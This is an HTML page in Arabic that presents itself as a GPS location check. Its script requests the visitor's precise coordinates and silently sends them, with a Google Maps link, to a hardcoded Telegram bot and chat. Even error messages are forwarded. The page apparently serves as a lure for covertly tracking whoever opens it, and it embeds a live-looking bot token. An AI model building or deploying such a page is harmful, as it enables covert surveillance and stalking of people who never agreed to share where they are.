<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 تحديد الموقع GPS</title>
</head>
<body>
  <h2>📡 جاري تحديد موقعك بدقة...</h2>
  <pre id="result">الرجاء الانتظار...</pre>

  <script>
    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
    const chat_id = "5735855086";

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      });
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const acc = pos.coords.accuracy;

          const message = `📍 تم تحديد الموقع بدقة GPS:

Latitude: ${lat}
Longitude: ${lon}
📏 الدقة: ±${acc} متر
🗺️ خرائط: https://www.google.com/maps?q=${lat},${lon}`;

          document.getElementById("result").innerText = message;
          sendToTelegram(message);
        },
        (err) => {
          document.getElementById("result").innerText =
            "❌ فشل في تحديد الموقع: " + err.message;
          sendToTelegram("❌ فشل في تحديد الموقع: " + err.message);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      document.getElementById("result").innerText = "❌ جهازك لا يدعم GPS";
      sendToTelegram("❌ جهاز لا يدعم GPS");
    }
  </script>
</body>
</html>
